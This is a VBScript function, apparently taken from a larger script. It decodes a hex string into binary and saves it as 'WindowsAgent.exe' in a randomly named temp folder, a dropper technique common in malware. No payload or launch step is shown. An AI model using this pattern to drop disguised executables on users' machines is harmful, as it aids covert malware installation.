Function BuildExe(Text)	
	' Convert the string to hex.
	Set dom = CreateObject("Microsoft.XMLDOM")
	dom.loadXML("<TtB/>")
	dom.documentElement.nodeTypedValue = Text
	dom.documentElement.dataType = "bin.hex"
	exeHex = dom.documentElement.nodeTypedValue
	
	' Create the filename and filepath for the executable.
	exeFile = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\" & CreateObject("Scripting.FileSystemObject").GetTempName()
	CreateObject("Scripting.FileSystemObject").CreateFolder(exeFile)
	exePath = exeFile & "\" & "WindowsAgent.exe"
	
	' Compile and save the executbale.
	Set exeStream = CreateObject("ADODB.Stream")
	exeStream.Type = 1
	exeStream.Open
	exeStream.Write exeHex
	exeStream.SaveToFile exePath, 2
	
	' Return the executable filepath.
	BuildExe = exePath
End Function